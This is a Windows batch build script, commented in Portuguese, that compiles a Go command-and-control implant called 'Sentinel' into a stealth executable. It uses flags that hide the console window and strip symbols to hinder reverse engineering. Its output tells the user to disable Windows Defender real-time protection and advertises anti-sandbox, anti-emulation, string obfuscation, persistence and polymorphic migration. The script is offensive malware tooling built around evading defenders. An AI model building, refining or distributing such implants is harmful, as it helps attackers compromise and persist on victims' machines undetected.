@echo off
REM Script de build otimizado para evasão máxima
REM Sentinel C2 Implant - Stealth Build

echo [+] Building Sentinel Implant with maximum evasion...
echo.

REM Limpar builds anteriores
if exist sentinel.exe del sentinel.exe
if exist test_evasion.exe del test_evasion.exe

echo [+] Compiling with stealth flags...

REM Build com flags anti-detecção:
REM -ldflags "-H=windowsgui -s -w"
REM   -H=windowsgui: Sem janela de console
REM   -s: Remove symbol table (dificulta reversing)
REM   -w: Remove DWARF debugging info
REM -trimpath: Remove caminhos absolutos do binário
REM -buildmode=exe: Executável standalone

set GOOS=windows
set GOARCH=amd64

go build ^
  -trimpath ^
  -ldflags "-H=windowsgui -s -w -X 'main.buildTime=%date% %time%'" ^
  -o sentinel.exe ^
  main.go

if %ERRORLEVEL% NEQ 0 (
    echo [-] Build failed!
    exit /b 1
)

echo.
echo [+] Build successful!
echo [+] Binary: sentinel.exe

REM Mostrar informações do arquivo
for %%A in (sentinel.exe) do (
    echo [+] Size: %%~zA bytes
)

echo.
echo [!] IMPORTANTE: Desabilite Windows Defender em tempo real antes de testar!
echo [!] Este binário implementa técnicas avançadas de evasão.
echo.
echo [*] Técnicas implementadas:
echo     - String Obfuscation (XOR)
echo     - Sleep Obfuscation
echo     - Random Delays
echo     - Anti-Emulation
echo     - Anti-Sandbox
echo     - Multi-Layer Persistence
echo     - Polymorphic Migration
echo.
pause
